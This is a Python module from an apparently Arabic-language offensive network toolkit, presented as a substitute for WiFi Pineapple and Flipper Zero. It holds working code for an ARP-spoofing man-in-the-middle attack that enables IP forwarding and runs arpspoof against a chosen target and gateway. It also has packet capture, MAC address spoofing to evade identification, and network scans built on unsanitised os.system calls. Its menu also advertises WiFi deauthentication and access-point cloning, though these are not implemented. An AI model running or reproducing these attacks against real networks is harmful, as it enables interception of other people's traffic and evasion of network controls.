#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Network Module - بديل WiFi Pineapple و Flipper Zero

import os
import subprocess
import sys
from colorama import init, Fore, Style
from banner import show_banner

init(autoreset=True)

class NetworkModule:
    def __init__(self):
        self.name = "Network Module"
    
    def show_menu(self):
        menu = f"""
{Fore.GREEN}╔══════════════════════════════════════════════╗
║       🌐  قائمة أدوات هجمات الشبكة          ║
╠══════════════════════════════════════════════╣
║                                              ║
║  {Fore.WHITE}[1] {Fore.GREEN}مسح الشبكة (Network Scan)            {Fore.GREEN}║
║  {Fore.WHITE}[2] {Fore.GREEN}هجوم ARP Spoofing (Man-in-the-Middle){Fore.GREEN}║
║  {Fore.WHITE}[3] {Fore.GREEN}اعتراض الحزم (Packet Capture)        {Fore.GREEN}║
║  {Fore.WHITE}[4] {Fore.GREEN}هجمات WiFi (Bettercap)               {Fore.GREEN}║
║  {Fore.WHITE}[5] {Fore.GREEN}فحص MAC Address                      {Fore.GREEN}║
║  {Fore.WHITE}[6] {Fore.GREEN}تغيير MAC Address                    {Fore.GREEN}║
║  {Fore.WHITE}[7] {Fore.GREEN}Sniffing HTTP Traffic                 {Fore.GREEN}║
║  {Fore.WHITE}[8] {Fore.GREEN}استنساخ WiFi Access Point             {Fore.GREEN}║
║  {Fore.WHITE}[9] {Fore.GREEN}فحص أجهزة الشبكة (NetDiscover)       {Fore.GREEN}║
║  {Fore.WHITE}[10] {Fore.GREEN}هجوم Deauthentication (WiFi)        {Fore.GREEN}║
║                                              ║
║  {Fore.RED}[0] {Fore.RED}العودة للقائمة الرئيسية             {Fore.GREEN}║
║                                              ║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)
    
    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] هذه العملية تتطلب صلاحيات root{Style.RESET_ALL}")
            return False
        return True
    
    def arp_spoof(self, target_ip, gateway_ip):
        """هجوم ARP Spoofing"""
        print(f"\n{Fore.YELLOW}[*] بدء هجوم ARP Spoofing...{Style.RESET_ALL}")
        print(f"    الهدف: {target_ip}")
        print(f"    البوابة: {gateway_ip}")
        
        try:
            # تمكين IP forwarding
            subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
            print(f"{Fore.GREEN}[✓] تم تمكين IP Forwarding{Style.RESET_ALL}")
            
            # ARP spoofing باستخدام arpspoof
            cmd1 = f"arpspoof -i wlan0 -t {target_ip} {gateway_ip}"
            cmd2 = f"arpspoof -i wlan0 -t {gateway_ip} {target_ip}"
            
            print(f"{Fore.YELLOW}[*] يتم تشغيل الهجوم... اضغط Ctrl+C للإيقاف{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] الأمر: {cmd1}{Style.RESET_ALL}")
            
            # تشغيل في الخلفية
            subprocess.Popen(cmd1.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(cmd2.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"\n{Fore.GREEN}[✓] الهجوم نشط! حركة المرور تمر الآن عبر جهازك.{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] يمكنك الآن تشغيل Wireshark أو tcpdump لاعتراض الحزم{Style.RESET_ALL}")
            
            input(f"\n{Fore.RED}اضغط Enter لإيقاف الهجوم...{Style.RESET_ALL}")
            
            # إيقاف
            subprocess.run("pkill arpspoof", shell=True)
            subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
            print(f"{Fore.GREEN}[✓] تم إيقاف الهجوم{Style.RESET_ALL}")
            
        except FileNotFoundError:
            print(f"{Fore.RED}[!] arpspoof غير مثبت. قم بتشغيل: pkg install dsniff{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] خطأ: {e}{Style.RESET_ALL}")
    
    def packet_capture(self, interface="wlan0"):
        """اعتراض الحزم"""
        print(f"\n{Fore.YELLOW}[*] بدء اعتراض الحزم على {interface}...{Style.RESET_ALL}")
        
        try:
            cmd = f"tcpdump -i {interface} -w camorro_capture_{interface}.pcap"
            print(f"{Fore.CYAN}[*] الأمر: {cmd}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] جاري التسجيل... اضغط Ctrl+C للإيقاف{Style.RESET_ALL}")
            
            subprocess.run(cmd.split(), timeout=30)
            
        except subprocess.TimeoutExpired:
            print(f"{Fore.GREEN}[✓] تم تسجيل 30 ثانية من الحزم{Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.RED}[!] tcpdump غير مثبت{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] خطأ: {e}{Style.RESET_ALL}")
    
    def change_mac(self, interface="wlan0"):
        """تغيير MAC Address"""
        print(f"\n{Fore.YELLOW}[*] تغيير MAC Address للواجهة {interface}{Style.RESET_ALL}")
        
        if not self.check_root():
            return
        
        try:
            # الحصول على MAC الحالي
            result = subprocess.run(f"ip link show {interface}".split(), 
                                  capture_output=True, text=True)
            print(f"{Fore.CYAN}[*] المعلومات الحالية:{Style.RESET_ALL}")
            print(result.stdout)
            
            # توليد MAC عشوائي
            import random
            new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
            
            print(f"{Fore.YELLOW}[*] تغيير MAC إلى: {new_mac}{Style.RESET_ALL}")
            
            subprocess.run(f"ip link set {interface} down".split(), check=True)
            subprocess.run(f"ip link set {interface} address {new_mac}".split(), check=True)
            subprocess.run(f"ip link set {interface} up".split(), check=True)
            
            print(f"{Fore.GREEN}[✓] تم تغيير MAC بنجاح!{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] خطأ: {e}{Style.RESET_ALL}")
    
    def run(self):
        show_banner("network")
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.GREEN}╰➤ {Fore.YELLOW}اختر العملية [0-10]: {Style.RESET_ALL}")
            
            if choice == "0":
                break
            elif choice == "1":
                network = input(f"\n{Fore.WHITE}[?] نطاق الشبكة (مثال: 192.168.1.0/24): {Style.RESET_ALL}").strip()
                if network:
                    print(f"\n{Fore.YELLOW}[*] فحص الشبكة {network}...{Style.RESET_ALL}")
                    os.system(f"nmap -sn {network}")
            elif choice == "2":
                target = input(f"{Fore.WHITE}[?] IP الهدف: {Style.RESET_ALL}").strip()
                gateway = input(f"{Fore.WHITE}[?] IP البوابة: {Style.RESET_ALL}").strip()
                if target and gateway:
                    self.arp_spoof(target, gateway)
            elif choice == "6":
                iface = input(f"{Fore.WHITE}[?] اسم الواجهة (wlan0): {Style.RESET_ALL}").strip() or "wlan0"
                self.change_mac(iface)
            elif choice == "9":
                network = input(f"\n{Fore.WHITE}[?] نطاق الشبكة: {Style.RESET_ALL}").strip() or "192.168.1.0/24"
                os.system(f"netdiscover -r {network}")
            else:
                print(f"{Fore.RED}[!] خيار غير صالح{Style.RESET_ALL}")
